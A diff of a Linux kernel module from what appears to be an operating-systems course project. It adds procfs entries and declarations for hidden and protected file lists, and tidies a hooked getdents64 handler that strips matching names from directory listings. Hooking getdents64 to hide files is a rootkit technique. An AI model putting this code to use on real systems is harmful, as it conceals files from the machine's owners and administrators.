@@ -25,10 +25,29 @@
 #include <linux/skbuff.h>
 #include <linux/init.h>
 #include <linux/fs.h>
-
+#include <linux/proc_fs.h>
 
 MODULE_DESCRIPTION("os_course");
 MODULE_AUTHOR("Darya Tatarinova");
+
+#define FILE_NAME (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)
+#define DMSG(msg_fmt, msg_args...) \
+    printk(KERN_INFO "OS: %s(%04u): " msg_fmt "\n", FILE_NAME, __LINE__, ##msg_args)
+
+#define MAX_BUF_SIZE 1000
+
+static struct proc_dir_entry *proc_file_hidden;
+static struct proc_dir_entry *proc_file_protected;
+
+extern char hidden_files[100][9];
+extern int hidden_index;
+extern char protected_files[100][9];
+extern int protected_index;
+ 
+static char *buffer[MAX_BUF_SIZE];
+
+static int read_index = 0;
+static int write_index = 0;
 
 static unsigned int major; 
 static struct class *fake_class;
@@ -410,12 +429,10 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
     {
         current_dir = (void *)dirent_ker + offset;
 
-        if ( check_fs_hidelist(current_dir->d_name))
+        if (check_fs_hidelist(current_dir->d_name))
         {
-
-            if( current_dir == dirent_ker )
+            if (current_dir == dirent_ker )
             {
-
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                 continue;
@@ -425,7 +442,6 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
         }
         else
         {
-
             previous_dir = current_dir;
         }
 
@@ -471,4 +487,3 @@ static int start_hook_resources(void)
         return err;
     return 0;
 }
-
